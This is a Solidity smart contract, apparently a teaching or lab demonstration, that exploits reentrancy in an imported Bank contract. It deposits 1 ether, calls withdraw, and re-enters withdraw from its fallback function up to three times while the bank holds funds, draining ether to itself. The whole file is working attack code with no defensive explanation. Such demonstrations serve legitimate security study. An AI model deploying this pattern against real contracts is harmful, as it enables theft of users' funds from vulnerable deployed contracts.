// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Bank.sol";

contract BankAttack {

    Bank bank;
    uint public count = 0;

    constructor(address bankContract) {
        bank = Bank(bankContract);
    }

    fallback () external payable {
        if (address(bank).balance >= 1 ether){
            if (count < 3) {
                count++;
                bank.withdraw();
            }
        }
    }

    function attack() external payable {
        count = 0;
        bank.deposit{value: 1 ether}();
        bank.withdraw();
        count = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}
